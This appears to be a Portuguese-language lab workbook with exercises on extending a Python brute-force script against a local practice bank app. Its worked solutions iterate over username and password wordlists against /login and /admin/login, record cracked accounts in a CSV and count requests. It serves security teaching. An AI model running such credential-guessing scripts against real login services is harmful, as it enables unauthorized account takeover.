# Caderno de Exercícios Práticos: Nível 02 (Múltiplos Alvos)

**Material de Referência:** `02_GUIA_PRATICO_USUARIOS_E_SENHAS.md`  
**Script Base:** `bruteforce_multi_usuarios.py`  
**Alvo:** NexusBank Corporate (`/login` e `/admin/login`)  

---

## 🎯 Objetivo Desta Lista

Praticar e aprofundar:
* Estruturas de laços aninhados em Python.
* Manipulação simultânea de múltiplos arquivos de entrada.
* Geração de relatórios consolidados em formato CSV.
* Ajuste de rotas conforme papéis de usuário (Role-Based Access Control - RBAC).

---

## Exercício 2.1 — Adicionando Novos Alvos na Lista

### Enunciado
O administrador do NexusBank cadastrou um novo cliente de teste no sistema:
* **Usuário:** `marcos`
* **Senha cadastrada:** `111111`

Atualize as bases de dados locais e execute o script para validar se o novo usuário é identificado automaticamente.

### Tarefas
1. Abra o arquivo `usuarios.txt` e adicione a linha `marcos`.
2. Verifique se `111111` já consta no arquivo `senhas.txt`.
3. Execute `bruteforce_multi_usuarios.py` e observe o comportamento do laço para a nova conta.

---

## Exercício 2.2 — Gravando Contas Comprometidas em CSV (`contas_comprometidas.csv`)

### Enunciado
Durante uma auditoria, os clientes que tiveram suas senhas descobertas precisam ser listados em um arquivo estruturado para a equipe de resposta a incidentes.  
Modifique o script para que, toda vez que uma senha for identificada com status 200, ele registre uma linha em `contas_comprometidas.csv` no formato:
`usuario,senha_descoberta`

### Tarefas
1. Antes do laço principal, crie o arquivo `contas_comprometidas.csv` e grave o cabeçalho: `usuario,senha`.
2. Dentro do `if resposta.status_code == 200:`, abra o arquivo com modo `"a"` (*append*) e adicione a linha do usuário validado.

### Resolução Sugerida
```python
import requests

url = "http://127.0.0.1:8002/login"

with open("usuarios.txt", "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open("senhas.txt", "r") as arq_s:
    senhas = arq_s.read().splitlines()

# Cria o arquivo CSV com cabeçalho
with open("contas_comprometidas.csv", "w", encoding="utf-8") as relatorio:
    relatorio.write("usuario,senha\n")

for usuario in usuarios:
    for senha in senhas:
        resposta = requests.post(url, json={"usuario": usuario, "senha": senha})

        if resposta.status_code == 200:
            print(f"[+] SUCESSO: {usuario}:{senha}")
            # Grava no CSV
            with open("contas_comprometidas.csv", "a", encoding="utf-8") as relatorio:
                relatorio.write(f"{usuario},{senha}\n")
            break
```

---

## Exercício 2.3 — Ajustando o Endpoint para o Administrador (`/admin/login`)

### Enunciado
No teste original, o usuário `admin` com a senha `admin123` retornou o código **403 Forbidden**, pois a rota `/login` aceita apenas o perfil `cliente`.  
A rota correta para funcionários administrativos é `/admin/login`.

Crie uma lógica condicional no envio da requisição:
* Se o usuário for `"admin"`, a URL usada deve ser `http://127.0.0.1:8002/admin/login`.
* Para os demais usuários, a URL deve permanecer `http://127.0.0.1:8002/login`.

### Tarefas
1. Antes de disparar `requests.post`, verifique com um `if usuario == "admin":`.
2. Execute o script e comprove se o `admin` agora retorna **Status 200**.

### Resolução Sugerida
```python
import requests

URL_CLIENTE = "http://127.0.0.1:8002/login"
URL_ADMIN = "http://127.0.0.1:8002/admin/login"

with open("usuarios.txt", "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open("senhas.txt", "r") as arq_s:
    senhas = arq_s.read().splitlines()

for usuario in usuarios:
    # Seleção dinâmica de rota baseada no perfil
    url_destino = URL_ADMIN if usuario == "admin" else URL_CLIENTE
    print(f"\n[+] Testando {usuario} na rota: {url_destino}")

    for senha in senhas:
        resposta = requests.post(url_destino, json={"usuario": usuario, "senha": senha})

        if resposta.status_code == 200:
            print(f"    >>> SUCESSO! A senha do {usuario} é: {senha} <<<")
            break
```

---

## Exercício 2.4 — Estatística de Requisições Totais

### Enunciado
Quantas requisições HTTP seu computador disparou ao todo para testar todos os usuários da lista?  
Adicione um contador global `total_requisicoes` que acumule as tentativas feitas em todos os usuários.

### Tarefas
1. Inicialize `total_requisicoes = 0` no início do script.
2. Some `+1` a cada chamada de `requests.post`.
3. Ao final de todos os testes, exiba o total acumulado.

### Resolução Sugerida
```python
import requests

url = "http://127.0.0.1:8002/login"

with open("usuarios.txt", "r") as arq_u:
    usuarios = arq_u.read().splitlines()

with open("senhas.txt", "r") as arq_s:
    senhas = arq_s.read().splitlines()

total_requisicoes = 0

for usuario in usuarios:
    for senha in senhas:
        total_requisicoes += 1
        resposta = requests.post(url, json={"usuario": usuario, "senha": senha})

        if resposta.status_code == 200:
            print(f"[+] Sucesso para {usuario} com senha {senha}")
            break

print(f"\n[i] Total acumulado de requisições disparadas: {total_requisicoes}")
```
